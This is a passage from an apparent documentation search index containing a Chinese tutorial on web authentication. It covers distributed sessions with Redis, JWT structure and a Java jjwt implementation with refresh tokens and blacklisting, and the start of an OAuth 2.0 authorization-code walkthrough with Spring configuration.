\u9500\u6bc1Session\n        return \"redirect:/login\";\n    }\n}\n</code></pre></p> <p>\u5206\u5e03\u5f0fSession\u89e3\u51b3\u65b9\u6848\uff1a</p> <ol> <li>Session\u590d\u5236\uff08Session Replication\uff09 <pre><code>&lt;!-- \u4f7f\u7528Tomcat\u96c6\u7fa4Session\u590d\u5236 --&gt;\n&lt;Cluster className=\"org.apache.catalina.ha.tcp.SimpleTcpCluster\"/&gt;\n</code></pre></li> <li>\u4f18\u70b9\uff1a\u65e0\u9700\u989d\u5916\u7ec4\u4ef6</li> <li> <p>\u7f3a\u70b9\uff1a\u6027\u80fd\u5f00\u9500\u5927\uff0c\u4e0d\u9002\u5408\u5927\u89c4\u6a21\u96c6\u7fa4</p> </li> <li> <p>Session\u7c98\u6027\uff08Sticky Session\uff09 <pre><code># Nginx\u914d\u7f6e\nupstream backend {\n    ip_hash; # \u6839\u636e\u5ba2\u6237\u7aefIP\u5206\u914d\u5230\u56fa\u5b9a\u670d\u52a1\u5668\n    server backend1.example.com;\n    server backend2.example.com;\n}\n</code></pre></p> </li> <li>\u4f18\u70b9\uff1a\u5b9e\u73b0\u7b80\u5355</li> <li> <p>\u7f3a\u70b9\uff1a\u670d\u52a1\u5668\u5b95\u673a\u5bfc\u81f4Session\u4e22\u5931\uff0c\u8d1f\u8f7d\u4e0d\u5747\u8861</p> </li> <li> <p>\u96c6\u4e2d\u5f0fSession\u5b58\u50a8\uff08\u63a8\u8350\uff09</p> </li> </ol> <p>\u4f7f\u7528Redis\u5b58\u50a8Session\uff1a <pre><code>&lt;!-- Spring Session + Redis --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre></p> <pre><code>/**\n * Spring Session\u914d\u7f6e\n */\n@Configuration\n@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)\npublic class SessionConfig {\n\n    @Bean\n    public LettuceConnectionFactory connectionFactory() {\n        return new LettuceConnectionFactory();\n    }\n}\n</code></pre> <pre><code># application.properties\nspring.redis.host=localhost\nspring.redis.port=6379\nspring.session.store-type=redis\nspring.session.redis.namespace=spring:session\n</code></pre> <p>Redis\u4e2d\u7684Session\u6570\u636e\u7ed3\u6784\uff1a <pre><code># Key\u683c\u5f0f\nspring:session:sessions:&lt;sessionId&gt;\nspring:session:sessions:expires:&lt;sessionId&gt;\nspring:session:expirations:&lt;expirationTime&gt;\n\n# Session\u5185\u5bb9\uff08Hash\u7ed3\u6784\uff09\nHGETALL spring:session:sessions:abc123\n1) \"sessionAttr:userId\"\n2) \"10001\"\n3) \"sessionAttr:username\"\n4) \"zhangsan\"\n5) \"creationTime\"\n6) \"1609459200000\"\n7) \"lastAccessedTime\"\n8) \"1609462800000\"\n9) \"maxInactiveInterval\"\n10) \"1800\"\n</code></pre></p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#token","title":"Token\u8ba4\u8bc1","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#token-vs-session","title":"Token vs Session","text":"\u7279\u6027 Session Token \u72b6\u6001 \u6709\u72b6\u6001\uff08\u670d\u52a1\u5668\u5b58\u50a8\uff09 \u65e0\u72b6\u6001\uff08\u5ba2\u6237\u7aef\u5b58\u50a8\uff09 \u5b58\u50a8\u4f4d\u7f6e \u670d\u52a1\u5668\u5185\u5b58/\u6570\u636e\u5e93/Redis \u5ba2\u6237\u7aef\uff08Cookie/LocalStorage\uff09 \u6269\u5c55\u6027 \u9700\u8981Session\u5171\u4eab\u673a\u5236 \u5929\u7136\u652f\u6301\u5206\u5e03\u5f0f \u8de8\u57df \u53d7Cookie\u9650\u5236 \u5bb9\u6613\u5b9e\u73b0\u8de8\u57df \u79fb\u52a8\u7aef \u4e0d\u53cb\u597d \u53cb\u597d \u540a\u9500 \u5bb9\u6613\uff08\u76f4\u63a5\u5220\u9664Session\uff09 \u56f0\u96be\uff08\u9700\u8981\u9ed1\u540d\u5355\u673a\u5236\uff09 \u6027\u80fd \u9700\u8981\u67e5\u8be2\u5b58\u50a8 \u9a8c\u8bc1\u7b7e\u540d\u5373\u53ef"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#jwt-json-web-token","title":"JWT (JSON Web Token)","text":"<p>JWT\u7ed3\u6784\uff1a <pre><code>Header.Payload.Signature\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n</code></pre></p> <p>1. Header\uff08\u5934\u90e8\uff09 <pre><code>{\n  \"alg\": \"HS256\",  // \u7b7e\u540d\u7b97\u6cd5\n  \"typ\": \"JWT\"      // \u4ee4\u724c\u7c7b\u578b\n}\n</code></pre></p> <p>2. Payload\uff08\u8f7d\u8377\uff09 <pre><code>{\n  // \u6807\u51c6\u58f0\u660e\uff08Registered Claims\uff09\n  \"iss\": \"https://auth.example.com\",  // \u7b7e\u53d1\u8005\n  \"sub\": \"user123\",                    // \u4e3b\u9898\uff08\u7528\u6237ID\uff09\n  \"aud\": \"https://api.example.com\",    // \u53d7\u4f17\n  \"exp\": 1735689600,                   // \u8fc7\u671f\u65f6\u95f4\uff08\u65f6\u95f4\u6233\uff09\n  \"nbf\": 1735686000,                   // \u751f\u6548\u65f6\u95f4\n  \"iat\": 1735686000,                   // \u7b7e\u53d1\u65f6\u95f4\n  \"jti\": \"uuid-1234\",                  // JWT ID\uff08\u552f\u4e00\u6807\u8bc6\uff09\n\n  // \u81ea\u5b9a\u4e49\u58f0\u660e\n  \"username\": \"zhangsan\",\n  \"roles\": [\"USER\", \"ADMIN\"],\n  \"email\": \"zhangsan@example.com\"\n}\n</code></pre></p> <p>3. Signature\uff08\u7b7e\u540d\uff09 <pre><code>HMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n</code></pre></p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#jwtjjwt","title":"JWT\u5b9e\u73b0\uff08\u4f7f\u7528jjwt\u5e93\uff09","text":"<pre><code>&lt;!-- Maven\u4f9d\u8d56 --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;\n    &lt;artifactId&gt;jjwt-api&lt;/artifactId&gt;\n    &lt;version&gt;0.11.5&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;\n    &lt;artifactId&gt;jjwt-impl&lt;/artifactId&gt;\n    &lt;version&gt;0.11.5&lt;/version&gt;\n    &lt;scope&gt;runtime&lt;/scope&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;\n    &lt;artifactId&gt;jjwt-jackson&lt;/artifactId&gt;\n    &lt;version&gt;0.11.5&lt;/version&gt;\n    &lt;scope&gt;runtime&lt;/scope&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>/**\n * JWT\u5de5\u5177\u7c7b\n */\n@Component\npublic class JwtTokenProvider {\n\n    @Value(\"${jwt.secret}\")\n    private String secretKey;\n\n    @Value(\"${jwt.expiration:3600000}\") // \u9ed8\u8ba41\u5c0f\u65f6\n    private long validityInMilliseconds;\n\n    private Key key;\n\n    @PostConstruct\n    protected void init() {\n        // \u751f\u6210\u5bc6\u94a5\n        byte[] keyBytes = Decoders.BASE64.decode(secretKey);\n        this.key = Keys.hmacShaKeyFor(keyBytes);\n    }\n\n    /**\n     * \u751f\u6210Token\n     */\n    public String createToken(User user) {\n        Date now = new Date();\n        Date validity = new Date(now.getTime() + validityInMilliseconds);\n\n        return Jwts.builder()\n            .setSubject(user.getUsername())\n            .setIssuer(\"https://auth.example.com\")\n            .setIssuedAt(now)\n            .setExpiration(validity)\n            .claim(\"userId\", user.getId())\n            .claim(\"email\", user.getEmail())\n            .claim(\"roles\", user.getRoles())\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }\n\n    /**\n     * \u9a8c\u8bc1Token\n     */\n    public boolean validateToken(String token) {\n        try {\n            Jwts.parserBuilder()\n                .setSigningKey(key)\n                .build()\n                .parseClaimsJws(token);\n            return true;\n        } catch (JwtException | IllegalArgumentException e) {\n            logger.error(\"Invalid JWT token: {}\", e.getMessage());\n            return false;\n        }\n    }\n\n    /**\n     * \u4eceToken\u83b7\u53d6\u7528\u6237\u540d\n     */\n    public String getUsername(String token) {\n        Claims claims = Jwts.parserBuilder()\n            .setSigningKey(key)\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n\n        return claims.getSubject();\n    }\n\n    /**\n     * \u4eceToken\u83b7\u53d6Claims\n     */\n    public Claims getClaims(String token) {\n        return Jwts.parserBuilder()\n            .setSigningKey(key)\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n    }\n\n    /**\n     * \u68c0\u67e5Token\u662f\u5426\u5373\u5c06\u8fc7\u671f\n     */\n    public boolean isTokenExpiringSoon(String token) {\n        Claims claims = getClaims(token);\n        Date expiration = claims.getExpiration();\n        long timeUntilExpiry = expiration.getTime() - System.currentTimeMillis();\n\n        // \u5982\u679c\u572815\u5206\u949f\u5185\u8fc7\u671f\uff0c\u8fd4\u56detrue\n        return timeUntilExpiry &lt; 900000;\n    }\n}\n</code></pre> <p>\u4f7f\u7528Filter\u8fdb\u884cJWT\u8ba4\u8bc1\uff1a <pre><code>/**\n * JWT\u8ba4\u8bc1\u8fc7\u6ee4\u5668\n */\n@Component\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                   HttpServletResponse response,\n                                   FilterChain filterChain) \n            throws ServletException, IOException {\n\n        try {\n            // \u4ece\u8bf7\u6c42\u5934\u83b7\u53d6Token\n            String token = extractTokenFromRequest(request);\n\n            if (token != null &amp;&amp; tokenProvider.validateToken(token)) {\n                // \u4eceToken\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n                String username = tokenProvider.getUsername(token);\n                UserDetails userDetails = userDetailsService.loadUserByUsername(username);\n\n                // \u521b\u5efa\u8ba4\u8bc1\u5bf9\u8c61\n                UsernamePasswordAuthenticationToken authentication = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails, \n                        null, \n                        userDetails.getAuthorities()\n                    );\n\n                authentication.setDetails(\n                    new WebAuthenticationDetailsSource().buildDetails(request)\n                );\n\n                // \u8bbe\u7f6e\u5230Security\u4e0a\u4e0b\u6587\n                SecurityContextHolder.getContext().setAuthentication(authentication);\n            }\n        } catch (Exception e) {\n            logger.error(\"Cannot set user authentication: {}\", e.getMessage());\n        }\n\n        filterChain.doFilter(request, response);\n    }\n\n    /**\n     * \u4ece\u8bf7\u6c42\u4e2d\u63d0\u53d6Token\n     */\n    private String extractTokenFromRequest(HttpServletRequest request) {\n        // \u65b9\u5f0f1: \u4eceAuthorization header\u83b7\u53d6\n        String bearerToken = request.getHeader(\"Authorization\");\n        if (StringUtils.hasText(bearerToken) &amp;&amp; bearerToken.startsWith(\"Bearer \")) {\n            return bearerToken.substring(7);\n        }\n\n        // \u65b9\u5f0f2: \u4eceCookie\u83b7\u53d6\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"token\".equals(cookie.getName())) {\n                    return cookie.getValue();\n                }\n            }\n        }\n\n        // \u65b9\u5f0f3: \u4ece\u67e5\u8be2\u53c2\u6570\u83b7\u53d6\uff08\u4e0d\u63a8\u8350\uff0c\u4ec5\u7528\u4e8e\u7279\u6b8a\u573a\u666f\uff09\n        return request.getParameter(\"token\");\n    }\n}\n</code></pre></p>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#jwt","title":"JWT\u6700\u4f73\u5b9e\u8df5","text":"<p>1. Token\u5237\u65b0\u7b56\u7565</p> <p>\u65b9\u6848\u4e00\uff1a\u53ccToken\u673a\u5236\uff08Access Token + Refresh Token\uff09 <pre><code>/**\n * \u53ccToken\u5b9e\u73b0\n */\n@Service\npublic class TokenService {\n\n    // Access Token: \u77ed\u671f\u6709\u6548\uff08\u598215\u5206\u949f\uff09\n    public String generateAccessToken(User user) {\n        return Jwts.builder()\n            .setSubject(user.getUsername())\n            .setExpiration(new Date(System.currentTimeMillis() + 900000)) // 15\u5206\u949f\n            .claim(\"type\", \"access\")\n            .signWith(accessTokenKey)\n            .compact();\n    }\n\n    // Refresh Token: \u957f\u671f\u6709\u6548\uff08\u59827\u5929\uff09\n    public String generateRefreshToken(User user) {\n        String token = Jwts.builder()\n            .setSubject(user.getUsername())\n            .setExpiration(new Date(System.currentTimeMillis() + 604800000)) // 7\u5929\n            .claim(\"type\", \"refresh\")\n            .signWith(refreshTokenKey)\n            .compact();\n\n        // \u5b58\u50a8Refresh Token\u5230\u6570\u636e\u5e93\uff08\u7528\u4e8e\u540a\u9500\uff09\n        refreshTokenRepository.save(new RefreshToken(token, user.getId()));\n\n        return token;\n    }\n\n    /**\n     * \u4f7f\u7528Refresh Token\u83b7\u53d6\u65b0\u7684Access Token\n     */\n    public TokenResponse refreshAccessToken(String refreshToken) {\n        // \u9a8c\u8bc1Refresh Token\n        if (!validateToken(refreshToken)) {\n            throw new InvalidTokenException(\"\u65e0\u6548\u7684Refresh Token\");\n        }\n\n        // \u68c0\u67e5Refresh Token\u662f\u5426\u5728\u6570\u636e\u5e93\u4e2d\uff08\u672a\u88ab\u540a\u9500\uff09\n        if (!refreshTokenRepository.existsByToken(refreshToken)) {\n            throw new TokenRevokedException(\"Refresh Token\u5df2\u88ab\u540a\u9500\");\n        }\n\n        // \u751f\u6210\u65b0\u7684Access Token\n        String username = getUsername(refreshToken);\n        User user = userService.findByUsername(username);\n        String newAccessToken = generateAccessToken(user);\n\n        return new TokenResponse(newAccessToken, refreshToken);\n    }\n}\n</code></pre></p> <p>API\u7aef\u70b9\uff1a <pre><code>@RestController\n@RequestMapping(\"/api/auth\")\npublic class AuthController {\n\n    @PostMapping(\"/login\")\n    public TokenResponse login(@RequestBody LoginRequest request) {\n        User user = authenticationService.authenticate(\n            request.getUsername(), \n            request.getPassword()\n        );\n\n        String accessToken = tokenService.generateAccessToken(user);\n        String refreshToken = tokenService.generateRefreshToken(user);\n\n        return new TokenResponse(accessToken, refreshToken);\n    }\n\n    @PostMapping(\"/refresh\")\n    public TokenResponse refresh(@RequestBody RefreshRequest request) {\n        return tokenService.refreshAccessToken(request.getRefreshToken());\n    }\n\n    @PostMapping(\"/logout\")\n    public void logout(@RequestBody LogoutRequest request) {\n        // \u540a\u9500Refresh Token\n        refreshTokenRepository.deleteByToken(request.getRefreshToken());\n\n        // \u53ef\u9009\uff1a\u5c06Access Token\u52a0\u5165\u9ed1\u540d\u5355\uff08Redis\uff09\n        String accessToken = request.getAccessToken();\n        Claims claims = tokenService.getClaims(accessToken);\n        long expirationTime = claims.getExpiration().getTime();\n        long ttl = expirationTime - System.currentTimeMillis();\n\n        if (ttl &gt; 0) {\n            redisTemplate.opsForValue().set(\n                \"blacklist:\" + accessToken, \n                \"1\", \n                ttl, \n                TimeUnit.MILLISECONDS\n            );\n        }\n    }\n}\n</code></pre></p> <p>2. Token\u540a\u9500\uff08Revocation\uff09</p> <pre><code>/**\n * Token\u9ed1\u540d\u5355\u68c0\u67e5\n */\n@Component\npublic class TokenBlacklistChecker {\n\n    @Autowired\n    private RedisTemplate&lt;String, String&gt; redisTemplate;\n\n    /**\n     * \u68c0\u67e5Token\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d\n     */\n    public boolean isBlacklisted(String token) {\n        return Boolean.TRUE.equals(\n            redisTemplate.hasKey(\"blacklist:\" + token)\n        );\n    }\n\n    /**\n     * \u5c06Token\u52a0\u5165\u9ed1\u540d\u5355\n     */\n    public void addToBlacklist(String token, long ttlMillis) {\n        redisTemplate.opsForValue().set(\n            \"blacklist:\" + token,\n            \"1\",\n            ttlMillis,\n            TimeUnit.MILLISECONDS\n        );\n    }\n}\n\n// \u5728JWT\u8fc7\u6ee4\u5668\u4e2d\u68c0\u67e5\u9ed1\u540d\u5355\nif (tokenBlacklistChecker.isBlacklisted(token)) {\n    response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n    return;\n}\n</code></pre> <p>3. JWT\u5b89\u5168\u5efa\u8bae</p> <pre><code>/**\n * JWT\u5b89\u5168\u914d\u7f6e\n */\npublic class JwtSecurityConfig {\n\n    // \u2705 1. \u4f7f\u7528\u5f3a\u5bc6\u94a5\uff08\u81f3\u5c11256\u4f4d\uff09\n    private static final String SECRET_KEY = generateStrongSecret(); // \u4e0d\u8981\u786c\u7f16\u7801\uff01\n\n    private static String generateStrongSecret() {\n        SecureRandom random = new SecureRandom();\n        byte[] secret = new byte[32]; // 256\u4f4d\n        random.nextBytes(secret);\n        return Base64.getEncoder().encodeToString(secret);\n    }\n\n    // \u2705 2. \u4f7f\u7528\u5f3a\u7b7e\u540d\u7b97\u6cd5\n    // \u5bf9\u79f0: HS512 (\u63a8\u8350) / HS256\n    // \u975e\u5bf9\u79f0: RS256, RS512, ES256\n\n    // \u2705 3. \u8bbe\u7f6e\u5408\u7406\u7684\u8fc7\u671f\u65f6\u95f4\n    private static final long ACCESS_TOKEN_VALIDITY = 15 * 60 * 1000; // 15\u5206\u949f\n    private static final long REFRESH_TOKEN_VALIDITY = 7 * 24 * 60 * 60 * 1000; // 7\u5929\n\n    // \u2705 4. \u9a8c\u8bc1\u6240\u6709\u58f0\u660e\n    public Claims validateAndParseClaims(String token) {\n        return Jwts.parserBuilder()\n            .setSigningKey(key)\n            .requireIssuer(\"https://auth.example.com\") // \u9a8c\u8bc1\u7b7e\u53d1\u8005\n            .requireAudience(\"https://api.example.com\") // \u9a8c\u8bc1\u53d7\u4f17\n            .build()\n            .parseClaimsJws(token)\n            .getBody();\n    }\n\n    // \u274c \u4e0d\u8981\u5728Payload\u4e2d\u5b58\u50a8\u654f\u611f\u4fe1\u606f\n    // Payload\u662fBase64\u7f16\u7801\uff0c\u4e0d\u662f\u52a0\u5bc6\uff01\n    // \u4e0d\u8981\u5b58\u50a8: \u5bc6\u7801\u3001\u4fe1\u7528\u5361\u53f7\u3001SSN\u7b49\n\n    // \u2705 5. \u5b9e\u73b0Token\u8f6e\u6362\uff08Rotation\uff09\n    // \u6bcf\u6b21\u4f7f\u7528Refresh Token\u65f6\uff0c\u9881\u53d1\u65b0\u7684Refresh Token\n\n    // \u2705 6. HTTPS Only\n    // \u4ec5\u901a\u8fc7HTTPS\u4f20\u8f93Token\n}\n</code></pre>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#oauth-20","title":"OAuth 2.0\u534f\u8bae","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#oauth-20_1","title":"OAuth 2.0\u6982\u8ff0","text":"<p>OAuth 2.0\u662f\u4ec0\u4e48\uff1f</p> <p>OAuth 2.0\u662f\u4e00\u4e2a\u6388\u6743\u534f\u8bae\uff0c\u5141\u8bb8\u7b2c\u4e09\u65b9\u5e94\u7528\u5728\u7528\u6237\u6388\u6743\u4e0b\u8bbf\u95ee\u7528\u6237\u5728\u53e6\u4e00\u4e2a\u670d\u52a1\u4e0a\u7684\u8d44\u6e90\uff0c\u800c\u65e0\u9700\u83b7\u53d6\u7528\u6237\u7684\u5bc6\u7801\u3002</p> <p>\u6838\u5fc3\u89d2\u8272\uff1a <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Resource    \u2502  \u8d44\u6e90\u6240\u6709\u8005\uff08\u7528\u6237\uff09\n\u2502   Owner      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 \u6388\u6743\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Client     \u2502 \u2500\u2500\u2500\u2192 \u2502 Authorization\u2502  \u6388\u6743\u670d\u52a1\u5668\n\u2502 (\u7b2c\u4e09\u65b9\u5e94\u7528)  \u2502 \u2190\u2500\u2500\u2500 \u2502   Server     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 Access Token\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Resource    \u2502  \u8d44\u6e90\u670d\u52a1\u5668\n\u2502   Server     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>\u793a\u4f8b\u573a\u666f\uff1a</p> <p>\u7528\u6237\u60f3\u8ba9\"\u5370\u8c61\u7b14\u8bb0\"\u8bbf\u95ee\u4ed6\u5728\"Google Drive\"\u4e2d\u7684\u6587\u4ef6</p> <ul> <li>Resource Owner: \u7528\u6237</li> <li>Client: \u5370\u8c61\u7b14\u8bb0</li> <li>Authorization Server: Google\u8ba4\u8bc1\u670d\u52a1\u5668</li> <li>Resource Server: Google Drive API</li> </ul>"},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#oauth-20_2","title":"OAuth 2.0\u6388\u6743\u6a21\u5f0f","text":""},{"location":"auth/02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/#1-authorization-code","title":"1. \u6388\u6743\u7801\u6a21\u5f0f\uff08Authorization Code\uff09","text":"<p>\u6700\u5b89\u5168\u3001\u6700\u5e38\u7528\u7684\u6a21\u5f0f\uff0c\u9002\u7528\u4e8e\u6709\u540e\u7aef\u670d\u52a1\u5668\u7684Web\u5e94\u7528\u3002</p> <p>\u6d41\u7a0b\uff1a <pre><code>\u7528\u6237                \u5ba2\u6237\u7aef              \u6388\u6743\u670d\u52a1\u5668           \u8d44\u6e90\u670d\u52a1\u5668\n \u2502                    \u2502                    \u2502                   \u2502\n \u2502 1. \u8bbf\u95ee\u5e94\u7528         \u2502                    \u2502                   \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                    \u2502                   \u2502\n \u2502                    \u2502 2. \u91cd\u5b9a\u5411\u5230\u6388\u6743\u9875   \u2502                   \u2502\n \u2502                    \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                   \u2502\n \u2502 3. \u7528\u6237\u767b\u5f55\u5e76\u6388\u6743   \u2502                    \u2502                   \u2502\n \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                   \u2502\n \u2502                    \u2502 4. \u8fd4\u56de\u6388\u6743\u7801       \u2502                   \u2502\n \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                   \u2502\n \u2502                    \u2502 5. \u7528\u6388\u6743\u7801\u6362Token  \u2502                   \u2502\n \u2502                    \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                   \u2502\n \u2502                    \u2502 6. \u8fd4\u56deAccess Token \u2502                   \u2502\n \u2502                    \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                   \u2502\n \u2502                    \u2502 7. \u8bf7\u6c42\u8d44\u6e90(\u5e26Token)\u2502                   \u2502\n \u2502                    \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502\n \u2502                    \u2502 8. \u8fd4\u56de\u53d7\u4fdd\u62a4\u8d44\u6e90   \u2502                   \u2502\n \u2502                    \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n</code></pre></p> <p>\u8be6\u7ec6\u6b65\u9aa4\uff1a</p> <p>Step 1: \u5ba2\u6237\u7aef\u8bf7\u6c42\u6388\u6743 <pre><code>GET /oauth/authorize?\n    response_type=code&amp;\n    client_id=CLIENT_ID&amp;\n    redirect_uri=https://client.com/callback&amp;\n    scope=read_profile,read_photos&amp;\n    state=random_state_string\nHost: auth.example.com\n</code></pre></p> <p>\u53c2\u6570\u8bf4\u660e\uff1a - <code>response_type=code</code>: \u8868\u793a\u4f7f\u7528\u6388\u6743\u7801\u6a21\u5f0f - <code>client_id</code>: \u5ba2\u6237\u7aefID\uff08\u5e94\u7528\u6ce8\u518c\u65f6\u83b7\u5f97\uff09 - <code>redirect_uri</code>: \u6388\u6743\u540e\u7684\u56de\u8c03\u5730\u5740 - <code>scope</code>: \u8bf7\u6c42\u7684\u6743\u9650\u8303\u56f4 - <code>state</code>: \u9632CSRF\u653b\u51fb\u7684\u968f\u673a\u5b57\u7b26\u4e32</p> <p>Step 2: \u7528\u6237\u6388\u6743 \u7528\u6237\u767b\u5f55\u5e76\u540c\u610f\u6388\u6743</p> <p>Step 3: \u8fd4\u56de\u6388\u6743\u7801 <pre><code>HTTP/1.1 302 Found\nLocation: https://client.com/callback?\n    code=AUTHORIZATION_CODE&amp;\n    state=random_state_string\n</code></pre></p> <p>Step 4: \u5ba2\u6237\u7aef\u7528\u6388\u6743\u7801\u6362\u53d6Token <pre><code>POST /oauth/token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&amp;\ncode=AUTHORIZATION_CODE&amp;\nredirect_uri=https://client.com/callback&amp;\nclient_id=CLIENT_ID&amp;\nclient_secret=CLIENT_SECRET\n</code></pre></p> <p>Step 5: \u8fd4\u56deAccess Token <pre><code>{\n  \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3600,\n  \"refresh_token\": \"tGzv3JOkF0XG5Qx2TlKWIA\",\n  \"scope\": \"read_profile read_photos\"\n}\n</code></pre></p> <p>Java\u5b9e\u73b0\uff08\u4f7f\u7528Spring Security OAuth2\uff09\uff1a</p> <pre><code>/**\n * OAuth2\u6388\u6743\u670d\u52a1\u5668\u914d\u7f6e\n */\n@Configuration\n@EnableAuthorizationServer\npublic class AuthorizationServerConfig extends AuthorizationServerConfigurerAdapter {\n\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    /**\n     * \u914d\u7f6e\u5ba2\u6237\u7aef\n     */\n    @Override\n    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {\n        clients.inMemory()\n            .withClient(\"client-app\")\n                .secret(passwordEncoder.encode(\"client-secret\"))\n                .authorizedGrantTypes(\n                    \"authorization_code\",\n                    \"refresh_token\",\n                    \"password\",\n                    \"client_credentials\"\n                )\n                .scopes(\"read\", \"write\")\n                .redirectUris(\"https://client.com/callback\")\n                .accessTokenValiditySeconds(3600)      // Access Token 1\u5c0f\u65f6\n                .refreshTokenValiditySeconds(86400);   // Refresh Token 24\u5c0f\u65f6\n    }\n\n    /**\n     * 